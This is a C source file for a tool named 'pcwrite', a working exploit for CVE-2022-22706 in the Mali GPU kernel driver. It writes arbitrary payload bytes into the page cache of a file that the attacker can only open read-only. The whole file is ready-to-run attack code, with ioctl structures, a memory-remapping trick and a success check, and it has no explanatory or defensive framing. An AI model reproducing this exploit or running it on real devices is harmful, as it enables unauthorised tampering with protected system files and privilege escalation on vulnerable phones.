/*
 * pcwrite - write a blob into the page cache of a file we can only open
 *           O_RDONLY, using CVE-2022-22706 on Mali bifrost-r18p0 (MRX-AL09).
 *
 * usage: pcwrite <target-file> <file-offset> <payload-file>
 *
 * The target file is never opened for writing; only O_RDONLY + mmap(PROT_READ).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
struct kbase_ioctl_set_flags { uint32_t create_flags; };
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
union kbase_ioctl_mem_alloc {
	struct { uint64_t va_pages, commit_pages, extension, flags; } in;
	struct { uint64_t flags, gpu_va; } out;
};
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
union kbase_ioctl_mem_import {
	struct { uint64_t flags, phandle; uint32_t type, padding; uint64_t header_page_number; } in;
	struct { uint64_t flags, gpu_va, va_pages; } out;
};
#define KBASE_IOCTL_MEM_IMPORT _IOWR(KBASE_IOCTL_TYPE, 22, union kbase_ioctl_mem_import)
struct kbase_ioctl_soft_event_update { uint64_t event; uint32_t new_status; uint32_t flags; };
#define KBASE_IOCTL_SOFT_EVENT_UPDATE _IOW(KBASE_IOCTL_TYPE, 28, struct kbase_ioctl_soft_event_update)

struct base_mem_import_user_buffer { uint64_t ptr, length; };
struct base_jd_udata { uint64_t blob[2]; };
struct base_dependency { uint8_t atom_id, dependency_type; };
struct base_jd_atom_v2 {
	uint64_t jc;
	struct base_jd_udata udata;
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	struct base_dependency pre_dep[2];
	uint8_t atom_number, prio, device_nr, padding[1];
	uint32_t core_req;
};
struct base_external_resource { uint64_t ext_resource; };

#define BASE_MEM_IMPORT_TYPE_USER_BUFFER 3
#define BASE_MEM_PROT_CPU_RD (1ULL << 0)
#define BASE_MEM_PROT_CPU_WR (1ULL << 1)
#define BASE_MEM_PROT_GPU_RD (1ULL << 2)
#define BASE_MEM_CACHED_CPU (1ULL << 12)   /* required: else alias is uncached */
#define BASE_MEM_SAME_VA (1ULL << 13)
#define BASE_MEM_MAP_TRACKING_HANDLE (3ULL << 12)
#define BASE_JD_REQ_EXTERNAL_RESOURCES (1U << 8)
#define BASE_JD_REQ_SOFT_JOB (1U << 9)
#define BASE_JD_REQ_SOFT_EVENT_WAIT (BASE_JD_REQ_SOFT_JOB | 0x5)
#define BASE_JD_SOFT_EVENT_SET 1
#define BASE_JD_SOFT_EVENT_RESET 0
#define PG 0x1000

static int mfd;
static void die(const char *w) { fprintf(stderr, "[-] %s: %s\n", w, strerror(errno)); exit(1); }
static void xio(unsigned long r, void *a, const char *w) { if (ioctl(mfd, r, a) < 0) die(w); }

int main(int argc, char **argv)
{
	if (argc != 4) { fprintf(stderr, "usage: %s <file> <offset> <payload>\n", argv[0]); return 2; }
	const char *target = argv[1];
	off_t off = strtoll(argv[2], NULL, 0);

	int pf = open(argv[3], O_RDONLY);
	if (pf < 0) die("open payload");
	struct stat ps;
	fstat(pf, &ps);
	size_t plen = ps.st_size;
	uint8_t *pl = mmap(NULL, plen, PROT_READ, MAP_PRIVATE, pf, 0);
	if (pl == MAP_FAILED) die("mmap payload");
	close(pf);

	/* Length to map from the target, page aligned: covers offset+plen. */
	size_t need = ((size_t)off + plen + PG - 1) & ~(size_t)(PG - 1);

	int fd = open(target, O_RDONLY);
	if (fd < 0) die("open target O_RDONLY");
	void *fmap = mmap(NULL, need, PROT_READ, MAP_SHARED, fd, 0);
	if (fmap == MAP_FAILED) die("mmap target");
	close(fd);

	mfd = open("/dev/mali0", O_RDWR);
	if (mfd < 0) die("open /dev/mali0");
	struct kbase_ioctl_version_check vc = { .major = 11, .minor = 16 };
	xio(KBASE_IOCTL_VERSION_CHECK, &vc, "version_check");
	struct kbase_ioctl_set_flags sf = { .create_flags = 0 };
	xio(KBASE_IOCTL_SET_FLAGS, &sf, "set_flags");
	void *tracking = mmap(NULL, PG, PROT_NONE, MAP_SHARED, mfd, BASE_MEM_MAP_TRACKING_HANDLE);
	if (tracking == MAP_FAILED) die("tracking mmap");

	void *anon = mmap(NULL, need, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (anon == MAP_FAILED) die("anon mmap");

	struct base_mem_import_user_buffer desc = { .ptr = (uint64_t)(uintptr_t)anon, .length = need };
	union kbase_ioctl_mem_import imp;
	memset(&imp, 0, sizeof(imp));
	imp.in.phandle = (uint64_t)(uintptr_t)&desc;
	imp.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;
	imp.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD |
		       BASE_MEM_CACHED_CPU;   /* REQUIRED for coherence with the page cache */
	xio(KBASE_IOCTL_MEM_IMPORT, &imp, "mem_import");

	if (munmap(anon, need)) die("munmap anon");
	if (mremap(fmap, need, need, MREMAP_MAYMOVE | MREMAP_FIXED, anon) == MAP_FAILED) die("mremap");

	size_t writable_len = imp.out.va_pages * PG;
	uint8_t *w = mmap(NULL, writable_len, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, (off_t)imp.out.gpu_va);
	if (w == MAP_FAILED) die("import mmap");

	union kbase_ioctl_mem_alloc ev;
	memset(&ev, 0, sizeof(ev));
	ev.in.va_pages = 1; ev.in.commit_pages = 1;
	ev.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD |
		      (1ULL << 3) | BASE_MEM_SAME_VA;
	xio(KBASE_IOCTL_MEM_ALLOC, &ev, "mem_alloc(event)");
	uint8_t *evp = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, (off_t)ev.out.gpu_va);
	if (evp == MAP_FAILED) die("event mmap");
	*evp = BASE_JD_SOFT_EVENT_RESET;

	struct base_external_resource ext = { .ext_resource = (uint64_t)(uintptr_t)w };
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)evp;
	atom.extres_list = (uint64_t)(uintptr_t)&ext;
	atom.nr_extres = 1;
	atom.atom_number = 1;
	atom.core_req = BASE_JD_REQ_EXTERNAL_RESOURCES | BASE_JD_REQ_SOFT_EVENT_WAIT;
	struct kbase_ioctl_job_submit sub = { .addr = (uint64_t)(uintptr_t)&atom, .nr_atoms = 1, .stride = sizeof(atom) };
	xio(KBASE_IOCTL_JOB_SUBMIT, &sub, "job_submit");

	memcpy(w + off, pl, plen);

	/* verify via a fresh read() of the same file (still never opened O_WRONLY) */
	int vf = open(target, O_RDONLY);
	if (vf < 0) die("open target for verify");
	uint8_t *chk = malloc(plen);
	if (pread(vf, chk, plen, off) != (ssize_t)plen) die("pread verify");
	close(vf);
	int ok = memcmp(chk, pl, plen) == 0;
	printf("[%s] page-cache write @ %s+0x%llx of %zu bytes\n",
	       ok ? "+" : "-", target, (unsigned long long)off, plen);

	struct kbase_ioctl_soft_event_update upd = { .event = (uint64_t)(uintptr_t)evp, .new_status = BASE_JD_SOFT_EVENT_SET };
	ioctl(mfd, KBASE_IOCTL_SOFT_EVENT_UPDATE, &upd);
	munmap(w, writable_len);
	munmap(evp, PG);
	munmap(tracking, PG);
	close(mfd);
	return ok ? 0 : 1;
}
